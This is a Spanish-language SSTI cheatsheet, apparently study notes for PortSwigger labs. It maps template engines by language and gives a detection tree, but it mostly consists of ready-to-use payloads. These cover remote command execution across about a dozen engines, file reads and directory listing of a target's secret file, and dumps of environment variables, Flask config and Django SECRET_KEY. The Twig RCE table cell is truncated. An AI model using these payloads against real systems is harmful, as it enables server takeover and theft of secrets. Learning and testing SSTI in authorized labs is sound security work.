# SSTI — Cheatsheet de motores

> 🗺️ **Esto es la hoja de consulta** (sintaxis + payloads por lenguaje). Para el **cómo/cuándo general** (detectar → identificar → explotar) andá al entry point: [[vulnerabilities/009-server-side-template-injection/server-side-template-injection|entry point]].

Referencia completa de motores/librerías de templates por lenguaje, con la sintaxis
básica que sirve para **identificar y explotar SSTI**.

> **Labs de PortSwigger** (7, con motor · lenguaje · payload que funcionó) → [[vulnerabilities/009-server-side-template-injection/labs/README|labs/README]].

> **SSTI** ocurre cuando la entrada del usuario se concatena dentro de una plantilla
> en lugar de pasarse como dato, permitiendo evaluar expresiones del motor y, en muchos
> casos, llegar a **RCE** (Remote Code Execution).

---

## Índice

- [Python](#-python)
- [PHP](#-php)
- [Node.js / JavaScript](#-nodejs--javascript)
- [Java / JVM](#-java--jvm)
- [Ruby](#-ruby)
- [Go](#-go)
- [C# / .NET](#-c--net)
- [Rust](#-rust)
- [Árbol de detección de SSTI](#-árbol-de-detección-de-ssti-metodología-portswigger)
- [Payloads de RCE por motor](#-payloads-de-rce-por-motor)
- [Herramientas](#-herramientas)
- [Referencias](#-referencias)

---

## 🐍 Python


| #   | Librería               | Sintaxis                | Confirmar                         | `ls` (RCE)                                              |
| --- | ---------------------- | ----------------------- | --------------------------------- | ------------------------------------------------------- |
| 1   | **Jinja2** (Flask)     | `{{ 7*7 }}` `{% for %}` | `{{7*7}}`→`49`                    | `{{cycler.__init__.__globals__.os.popen('ls').read()}}` |
| 2   | **Django Templates**   | `{{ var }}` `{% tag %}` | — (sandbox, no evalúa aritmética) | —                                                       |
| 3   | **Mako** (Pyramid)     | `${ 7*7 }` `<% %>`      | `${7*7}`→`49`                     | `${self.module.cache.util.os.system("ls")}`             |
| 4   | **Tornado**            | `{{ 7*7 }}` `{% %}`     | `{{7*7}}`→`49`                    | `{% import os %}{{os.popen('ls').read()}}`              |
| 5   | **Genshi / Chameleon** | `${...}` (XML)          | `${7*7}`→`49`                     | — (limitado)                                            |


---

## 🐘 PHP


| #   | Librería            | Sintaxis                 | Confirmar             | `ls` (RCE)            |
| --- | ------------------- | ------------------------ | --------------------- | --------------------- |
| 1   | **Twig** (Symfony)  | `{{ 7*7 }}` `{% %}`      | `{{7*7}}`→`49`        | `{{ ['ls']            |
| 2   | **Blade** (Laravel) | `{{ $var }}` `@if`       | — (escapa, no evalúa) | —                     |
| 3   | **Smarty**          | `{$var}` `{7*7}`         | `{7*7}`→`49`          | `{system('ls')}`      |
| 4   | **Plates**          | PHP nativo `<?= ?>`      | `<?= 7*7 ?>`→`49`     | `<?= system('ls') ?>` |
| 5   | **Mustache.php**    | `{{ var }}` (logic-less) | — (sin lógica)        | —                     |


---

## 🟢 Node.js / JavaScript


| #   | Librería                | Sintaxis              | Confirmar         | `ls` (RCE)                                                                                                  |
| --- | ----------------------- | --------------------- | ----------------- | ----------------------------------------------------------------------------------------------------------- |
| 1   | **EJS**                 | `<%= 7*7 %>` `<% %>`  | `<%= 7*7 %>`→`49` | `settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('ls');s` |
| 2   | **Pug** (ex-Jade)       | `#{7*7}`              | `#{7*7}`→`49`     | `#{(function(){return global.process.mainModule.require('child_process').execSync('ls')})()}`               |
| 3   | **Handlebars**          | `{{ var }}` `{{#if}}` | — (logic-less)    | — (RCE vía prototype, no one-liner)                                                                         |
| 4   | **Nunjucks** (≈Jinja)   | `{{ 7*7 }}` `{% %}`   | `{{7*7}}`→`49`    | `{{range.constructor("return global.process.mainModule.require('child_process').execSync('ls')")()}}`       |
| 5   | **Lodash `_.template*`* | `<%= %>`              | `<%= 7*7 %>`→`49` | `<%= global.process.mainModule.require('child_process').execSync('ls') %>`                                  |


---

## ☕ Java / JVM


| #   | Librería               | Sintaxis           | Confirmar             | `ls` (RCE)                                                                                                         |
| --- | ---------------------- | ------------------ | --------------------- | ------------------------------------------------------------------------------------------------------------------ |
| 1   | **Thymeleaf** (Spring) | `${...}` `[[...]]` | `[[${7*7}]]`→`49`     | `[[${T(java.lang.Runtime).getRuntime().exec('ls')}]]`                                                              |
| 2   | **FreeMarker**         | `${7*7}` `<#if>`   | `${7*7}`→`49`         | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("ls")}`                                              |
| 3   | **Velocity** (Apache)  | `$var` `#set`      | `#set($x=7*7)$x`→`49` | `#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("ls")` |
| 4   | **JSP / JSTL**         | `<%= %>` `${...}`  | `${7*7}`→`49` (EL)    | `<%= Runtime.getRuntime().exec("ls") %>`                                                                           |
| 5   | **Groovy / GSP**       | `${...}` `<% %>`   | `${7*7}`→`49`         | `${"ls".execute().text}`                                                                                           |


---

## 💎 Ruby


| #   | Librería                | Sintaxis             | Confirmar         | `ls` (RCE)            |
| --- | ----------------------- | -------------------- | ----------------- | --------------------- |
| 1   | **ERB** (Rails default) | `<%= 7*7 %>` `<% %>` | `<%= 7*7 %>`→`49` | `<%= system('ls') %>` |
| 2   | **Haml**                | `= 7*7`              | `= 7*7`→`49`      | `= system('ls')`      |
| 3   | **Slim**                | `= 7*7`              | `= 7*7`→`49`      | `= system('ls')`      |
| 4   | **Liquid** (Shopify)    | `{{ 7*7 }}` `{% %}`  | — (sandbox)       | —                     |
| 5   | **Mustache (Ruby)**     | `{{ var }}`          | — (logic-less)    | —                     |


---

## 🔷 Go


| #   | Librería                   | Sintaxis           | Notas                             |
| --- | -------------------------- | ------------------ | --------------------------------- |
| 1   | **text/template** (stdlib) | `{{ . }}` `{{if}}` | `{{.}}` refleja; SSTI → info leak |
| 2   | **html/template** (stdlib) | `{{ . }}`          | Auto-escape XSS-safe              |
| 3   | **Pongo2** (≈Django)       | `{{ }}` `{% %}`    | Sintaxis Django                   |
| 4   | **Templ**                  | Go-code + HTML     | Compilado, type-safe              |
| 5   | **Jet / Ace**              | `{{ }}`            | Frameworks web                    |


---

## 🔶 C# / .NET


| #   | Librería            | Sintaxis                      |
| --- | ------------------- | ----------------------------- |
| 1   | **Razor** (ASP.NET) | `@Model.X` `@{ }` `@if`       |
| 2   | **Blazor**          | `@code` + componentes         |
| 3   | **RazorLight**      | Razor standalone (emails)     |
| 4   | **Scriban**         | `{{ x }}` (≈Liquid)           |
| 5   | **DotLiquid**       | `{{ }}` `{% %}` (Liquid port) |


---

## 🦀 Rust


| #   | Librería                           | Sintaxis          |
| --- | ---------------------------------- | ----------------- |
| 1   | **Tera** (≈Jinja)                  | `{{ }}` `{% %}`   |
| 2   | **Askama** (compilado, Jinja-like) | `{{ }}` `{% %}`   |
| 3   | **Handlebars-rust**                | `{{ }}`           |
| 4   | **Maud**                           | Macro `html! { }` |
| 5   | **Liquid-rust**                    | `{{ }}` `{% %}`   |


---

## 🎯 Árbol de detección de SSTI (metodología PortSwigger)

Inyecta el polyglot `${{<%[%'"}}%\` y observa errores, luego:

```
        ${7*7}  →  49 ?
       /        \
   Sí (Java EL,           No
    Smarty, Mako)          |
                      {{7*7}}  →  49 ?
                     /            \
                 Sí                No → probablemente no SSTI
                  |
         {{7*'7'}} → 49 (Twig)  o  7777777 (Jinja2)
```

- `${7*7}` → **49**: Java EL, **Mako**, **Smarty**
- `{{7*7}}` → **49**: **Jinja2** o **Twig** → diferenciar con `{{7*'7'}}`
  - → `49` = **Twig**
  - → `7777777` = **Jinja2**
- `<%= 7*7 %>` → **49**: **ERB** o **EJS**
- `#{7*7}` → **49**: **Pug**

### Metodología general

1. **Detectar** — inyecta el polyglot y busca errores/comportamiento anómalo.
2. **Identificar** — usa el árbol para determinar el motor exacto.
3. **Explotar** — lee la documentación del motor para leer variables, invocar
  métodos y (si es posible) llegar a ejecución de comandos.

---

## 💥 Payloads de RCE por motor

> ⚠️ Solo para uso en entornos autorizados (labs, CTF, pentesting con permiso).

### Jinja2 (Python)

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Twig (PHP)

```twig
{{ ['id'] | filter('system') }}
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}
```

### Smarty (PHP)

```smarty
{system('id')}
{php}system('id');{/php}
```

### Mako (Python)

```mako
${ self.module.cache.util.os.system("id") }
<%import os%>${os.popen('id').read()}
```

### FreeMarker (Java)

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
${"freemarker.template.utility.Execute"?new()("id")}
```

### Velocity (Java)

```velocity
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

### Thymeleaf (Java / Spring)

```thymeleaf
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
```

### EJS (Node.js)

```
settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');s
```

### Nunjucks (Node.js)

```nunjucks
{{ range.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}
```

### Pug (Node.js)

```pug
#{ (function(){ return global.process.mainModule.require('child_process').execSync('id') })() }
```

### ERB (Ruby)

```erb
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
```

---

> **Nota general:** en Windows usá `dir` en lugar de `ls`. En Java/Runtime a veces
> necesitás `exec(new String[]{"cmd","/c","dir"})` porque `exec("ls")` no pasa por shell.
> Go, C# y Rust no aparecen con columna `ls` porque sus motores top son sandbox o
> solo permiten fugas de info (no ejecución de comandos).

---

## 📖 Leer archivos y listar directorios (sin depender del shell)

> En **Stage 3** el objetivo suele ser **leer** `/home/carlos/secret`, no ejecutar un comando. Casi todos los motores tienen **API nativa de archivos** → más limpio que `system`/`popen` y **funciona aunque el shell esté filtrado o sandboxeado**.

### Python — Jinja2
```jinja2
{# leer #}
{{ cycler.__init__.__globals__.__builtins__.open('/home/carlos/secret').read() }}
{# listar #}
{{ cycler.__init__.__globals__.__builtins__.__import__('os').listdir('/home/carlos') }}
```

### Python — Mako
```mako
## leer
${ open('/home/carlos/secret').read() }
## listar
<% import os %>${ os.listdir('/home/carlos') }
```

### Python — Tornado
```
{# leer (open del builtins) #}
{{ __import__('builtins').open('/home/carlos/secret').read() }}
{# listar #}
{{ __import__('os').listdir('/home/carlos') }}
{# variante shell #}
{{ __import__('os').popen('ls').read() }}
```

### Ruby — ERB
```erb
<%# leer %>
<%= File.read('/home/carlos/secret') %>
<%= File.open('/example/arbitrary-file').read %>
<%# listar %>
<%= Dir.entries('/') %>
<%# shell (backticks) %>
<%= `cat /home/carlos/secret` %>
```

### Java — FreeMarker
```freemarker
<#-- shell vía Execute --#>
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("cat /home/carlos/secret") }
<#-- leer SIN Execute (útil en sandbox): reflection sobre un objeto disponible --#>
${ product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/secret').toURL().openStream().readAllBytes()?join(" ") }
```
> El `?join(" ")` devuelve los **bytes en decimal** → decodificalos a texto.

### Node — Handlebars
> En el mismo chain del exploit (ver [[vulnerabilities/009-server-side-template-injection/labs/README|lab 4]]), cambiás `child_process` por `fs`:
```
{{this.push "return require('fs').readFileSync('/home/carlos/secret').toString();"}}   ← leer
{{this.push "return require('fs').readdirSync('/home/carlos').toString();"}}            ← listar
```

### PHP — Twig / Smarty (bonus: no están en el examen, pero salvan)
```twig
{# Twig: source() devuelve el contenido crudo de un archivo #}
{{ source('/home/carlos/secret') }}
```
```smarty
{* Smarty: fetch lee un archivo *}
{fetch file='/home/carlos/secret'}
```

### Django
- **No** hay API de archivos en el template (sandbox estricto). Acá el camino no es leer un archivo sino **fuga de info**: `{% debug %}` para enumerar → `{{ settings.SECRET_KEY }}`.

---

## 🔎 Recon del entorno (variables, config, secretos)

> Antes de ir por RCE, mirá qué **objetos/variables** ya tenés a mano — a veces alcanzan (SECRET_KEY, credenciales, rutas).

- **Java / Spring EL** — variables de entorno del proceso:
  ```
  ${T(java.lang.System).getenv()}
  ${T(java.lang.System).getProperty("user.dir")}
  ```
- **Django (Python)** — enumerar el contexto y leer settings:
  ```
  {% debug %}
  {{ settings.SECRET_KEY }}
  ```
- **Jinja2 (Python)** — config de Flask (suele traer la SECRET_KEY):
  ```
  {{ config }}
  {{ config.items() }}
  ```

---

## 🛠️ Herramientas

- **[tplmap](https://github.com/epinna/tplmap)** — SSTI scanner/exploiter automático.
- **[SSTImap](https://github.com/vladko312/SSTImap)** — fork moderno de tplmap.
- **Burp Suite Intruder** — fuzz con la wordlist de payloads polyglot.
- **[PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)** — colección de payloads.

---

## 📚 Referencias

- PortSwigger Web Security Academy — *Server-side template injection*
[https://portswigger.net/web-security/server-side-template-injection](https://portswigger.net/web-security/server-side-template-injection)
- HackTricks — *SSTI (Server Side Template Injection)*
[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- OWASP — *Testing for Server-Side Template Injection*

